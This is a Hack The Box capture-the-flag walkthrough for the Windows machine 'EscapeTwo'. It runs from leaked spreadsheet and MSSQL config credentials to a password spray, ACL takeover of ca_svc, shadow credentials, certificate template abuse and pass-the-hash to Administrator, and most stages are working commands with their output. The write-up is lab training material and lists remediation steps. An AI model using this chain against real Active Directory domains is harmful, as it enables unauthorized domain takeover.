---
title: HTB EscapeTwo
slug: htb-escapetwo-writeup
type: writeup
category: htb
date: 2025-05-15
difficulty: easy
os: windows
readTime: 14 min read
points: 30
tags: [AD, LDAP, SMB, ADCS]
classification: CLASSIFIED-WHITE
summary: Default `rose` creds → SMB share with spreadsheet secrets → `sa` MSSQL → `sql_svc` config file leak → password spray to `ryan` → ADCS ESC-style chain via `ca_svc` to Administrator NT hash.
engagement:
  platform: Hack The Box
  target: sequel.htb
  ref: 10.10.11.51
  start: 13:33 CDT
  duration: 14 min read
  operator: WDD-01
killchain:
  - { stage: RECON,  sub: "ldap + smb",              tag: NETEXEC,  color: warn }
  - { stage: CREDS,  sub: ".xlsx xml leak",          tag: SMB,      color: warn }
  - { stage: SQL,    sub: "xp_cmdshell → .INI leak", tag: MSSQL,    color: warn }
  - { stage: USER,   sub: "ryan password spray",     tag: WINRM,    color: warn }
  - { stage: ADCS,   sub: "ca_svc shadow + template", tag: CERTIPY, color: warn }
  - { stage: ADMIN,  sub: "Administrator NT hash",   tag: GOAL,     color: ok }
loadout:
  - { tool: nmap,       purpose: recon }
  - { tool: netexec,    purpose: auth }
  - { tool: smbclient,  purpose: smb }
  - { tool: impacket,   purpose: ad }
  - { tool: bloodhound, purpose: graph }
  - { tool: bloodyAD,   purpose: ace-flip }
  - { tool: certipy,    purpose: adcs }
  - { tool: evil-winrm, purpose: shell }
remediation:
  - Never commit credentials inside shared spreadsheets or config files
  - Disable `xp_cmdshell` on MSSQL; least-privilege service accounts
  - Scope `WriteOwner` / `GenericAll` ACEs on cert authority objects
  - Harden default cert templates (no `EnrolleeSuppliesSubject`, strong EKU scoping)
---

::: stage n=1 label="RECON" title="Default creds open the front door."

`rose / [REDACTED]` are the provided credentials. Nmap confirms a full AD stack: DNS, Kerberos, LDAP (389/3268), SMB, RPC over HTTP, MSSQL 2019, WinRM.

::: terminal title="shell · operator@kali" lang="bash"
$ nmap -A -T5 -oN nmap.txt 10.10.11.51 --min-rate 2000
53/tcp    open  domain
88/tcp    open  kerberos-sec
389/tcp   open  ldap     Microsoft AD LDAP (Domain: sequel.htb)
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00
5985/tcp  open  http     Microsoft HTTPAPI 2.0
:::

Enumerate domain users with netexec + the provided creds:

::: terminal title="shell · operator@kali" lang="bash"
$ netexec ldap 10.10.11.51 -u rose -p '[REDACTED]' --users
LDAP  [+] sequel.htb\rose:[REDACTED]
LDAP  Administrator  Guest  krbtgt  michael  ryan  oscar  sql_svc  rose  ca_svc
:::

::: img src="../assets/img/writeups/htb-escapetwo/01-netexec-users.png" caption="rose's provided creds pull the full AD user list — sql_svc + ca_svc are the flags"

:::

::: stage n=2 label="CREDS" title="`Accounting Department` share → corrupt `.xlsx` leaks XML creds."

`smbclient -L` lists an `Accounting Department` share readable by rose. Two spreadsheets: `accounting_2024.xlsx` and `accounts.xlsx`. Both open corrupted in Excel — but `.xlsx` is just a zip of XML.

::: terminal title="shell · operator@kali" lang="bash"
$ smbclient "//10.10.11.51/Accounting Department" -U rose
smb: \> get accounts.xlsx
$ unzip accounts.xlsx -d accounts/
$ cat accounts/xl/sharedStrings.xml
<t>oscar@sequel.htb</t>
<t>kevin@sequel.htb</t>
<t>NULL</t>
<t>sa@sequel.htb</t>    ← MSSQL sa account
<t>MSSQL@somelongstring...</t>
:::

The most interesting leak is {red:sa@sequel.htb} — the MSSQL `sa` login.

::: img src="../assets/img/writeups/htb-escapetwo/02-xlsx-xml.png" caption="accounts.xlsx is just a zip — sharedStrings.xml leaks sa@sequel.htb"

:::

::: stage n=3 label="SQL" title="`xp_cmdshell` + config leak = `sql_svc` password."

::: terminal title="shell · sa · mssqlclient" lang="bash"
$ impacket-mssqlclient 'sa:[REDACTED]@10.10.11.51'
SQL (sa  dbo@master)> EXEC xp_cmdshell 'type \SQL2019\ExpressAdv_ENU\sql-Configuration.INI'
[OPTIONS]
...
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="[REDACTED]"      ← old sql_svc password
SAPWD="[REDACTED]"
:::

::: img src="../assets/img/writeups/htb-escapetwo/03-mssqlclient.png" caption="mssqlclient as sa — xp_cmdshell prints the config INI with the old sql_svc password"

Not a current-password match, but the exposed `sql_svc` password is the seed for a password spray.

:::

::: stage n=4 label="USER" title="Spray it across the whole user list → `ryan`."

::: terminal title="shell · operator@kali" lang="bash"
$ nxc smb 10.10.11.51 -u ./users.txt -p ./pass.txt
SMB  sequel.htb\ryan:[REDACTED]       [+]
$ nxc winrm 10.10.11.51 -u ryan -p '[REDACTED]'
WINRM 5985 DC01 [+] sequel.htb\ryan:[REDACTED] (Pwn3d!)

$ evil-winrm -i 10.10.11.51 -u ryan -p '[REDACTED]'
*Evil-WinRM* PS C:\Users\ryan\Desktop> type user.txt
:::

::: img src="../assets/img/writeups/htb-escapetwo/04-ryan-winrm.png" caption="Password spray hits ryan — WinRM marked Pwn3d!"

:::

::: stage n=5 label="ADCS" title="`WriteOwner` on `ca_svc` → shadow creds → vulnerable template."

Running BloodHound as ryan shows exactly one outbound object control: {warn:WriteOwner} on `ca_svc`. That's enough to seize the Certificate Authority service account.

::: img src="../assets/img/writeups/htb-escapetwo/05-bloodhound-writeowner.png" caption="ryan@sequel.htb — a single outbound edge: WriteOwner on ca_svc"

::: terminal title="shell · ryan · bloodyAD + dacledit" lang="bash"
$ bloodyAD -u ryan -p '[REDACTED]' -d sequel.htb \
    --host dc01.sequel.htb set owner ca_svc ryan
[+] Old owner S-1-5-21-... is now replaced by ryan on ca_svc

$ dacledit.py -action write -rights FullControl \
    -principal ryan -target ca_svc sequel.htb/ryan:'[REDACTED]'
[*] DACL backed up to dacledit-...bak
[*] DACL modified successfully!
:::

Shadow-credential the `ca_svc` account to get its NT hash:

::: terminal title="shell · ryan · certipy" lang="bash"
$ certipy-ad shadow auto -u 'ryan@sequel.htb' -p '[REDACTED]' -account ca_svc
[*] Generating certificate ... Adding Key Credential ... Authenticating as 'ca_svc'
[*] NT hash for 'ca_svc': [REDACTED]
:::

Enumerate the 34 templates — `DunderMifflinAuthentication` is the deliberately-weakened one. Grab a ticket for `ca_svc`, forge a certificate for {red:administrator@sequel.htb}:

::: terminal title="shell · ryan · certipy" lang="bash"
$ KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template -k \
    -template DunderMifflinAuthentication -dc-ip 10.10.11.51 -target dc01.sequel.htb
[*] Successfully updated 'DunderMifflinAuthentication'

$ certipy-ad req -u ca_svc -hashes :[ca_svc NT hash] \
    -ca sequel-DC01-CA -template DunderMifflinAuthentication \
    -target DC01.sequel.htb -dns 10.10.11.51 \
    -upn administrator@sequel.htb
[*] Saved certificate and private key to 'administrator_10.pfx'
:::

:::

::: stage n=6 label="ADMIN" title="`certipy auth` → NT hash → PTH → flag."

::: terminal title="shell · ryan · certipy" lang="bash"
$ certipy-ad auth -pfx administrator_10.pfx -domain sequel.htb
[*] Using principal: administrator@sequel.htb
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:[NT HASH]
:::

::: img src="../assets/img/writeups/htb-escapetwo/06-cert-auth.png" caption="certipy auth prints the LM:NT hash pair for Administrator"

::: terminal title="shell · ryan · PTH" lang="bash"
$ evil-winrm -i 10.10.11.51 -u administrator -H [NT HASH]
*Evil-WinRM* PS> type ..\Desktop\root.txt
:::

::: tip
ADCS ESC-style abuse keeps working because admins rarely audit certificate templates. If `certipy find --vulnerable` returns *anything* in a lab or pentest, expect trouble in prod too.
:::

:::
